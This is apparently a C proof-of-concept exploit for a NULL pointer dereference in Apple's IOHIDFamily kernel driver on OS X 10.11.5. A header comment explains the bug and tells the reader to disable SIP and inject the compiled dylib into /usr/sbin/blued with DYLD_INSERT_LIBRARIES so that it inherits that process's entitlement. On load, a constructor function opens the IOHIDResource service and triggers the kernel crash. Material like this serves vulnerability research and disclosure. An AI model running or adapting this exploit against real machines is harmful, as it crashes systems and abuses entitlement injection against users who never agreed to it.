/*
 * Considering how many researchers have thrown themselves at IOHIDFamily and
 * reported bugs to Apple I actually cannot believe this one hasn't been
 * reported, yet...
 *
 * To test on OS X 10.11.5 disable SIP (so we can use DYLD_INSERT_LIBRARIES
 * to steal the right entitlement, or use any other exploit that 
 * allows you to do the same :P) and then just do:
 * DYLD_INSERT_LIBRARIES=./spwn.dylib /usr/sbin/blued
 *
 * Bug is a simple NULL ptr deref.
 *
 * IOReturn IOHIDResourceDeviceUserClient::registerNotificationPortGated(mach_port_t port)
 * {
 *    IOReturn result;
 *    
 *    require_action(!isInactive(), exit, result=kIOReturnOffline);
 *
 *    _port = port;
 *    _queue->setNotificationPort(port);
 *       \---------------------------------------- PE_i_can_has_value?
 *    result = kIOReturnSuccess;
 * exit:
 *    return result;
 * }
 *
 */

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>

#include <mach/mach.h>

#include <IOKit/IOKitLib.h>

__attribute__((constructor)) int trigger() 
{

	mach_port_t service = 0;
	mach_port_t iterator = 0;
	mach_port_t connect = 0;
	kern_return_t kr = 0;

	IOServiceGetMatchingServices(kIOMasterPortDefault, IOServiceMatching("IOHIDResource"), &iterator);
	
	service = IOIteratorNext(iterator);
	if (service == 0) {
		printf("kidding?\n");
		_exit(2);
	}
	
	/* nowadays we need some entitlements */
  
	kr = IOServiceOpen(service, mach_task_self(), 0, &connect);
	if (kr != KERN_SUCCESS) {
		printf("ERROR: 0x%x\n", kr);
		_exit(1);
	}

	/* 3.. 2.. 1.. boom */
  
	IOConnectSetNotificationPort(connect, 0, -1, 0);
	return 1;
}
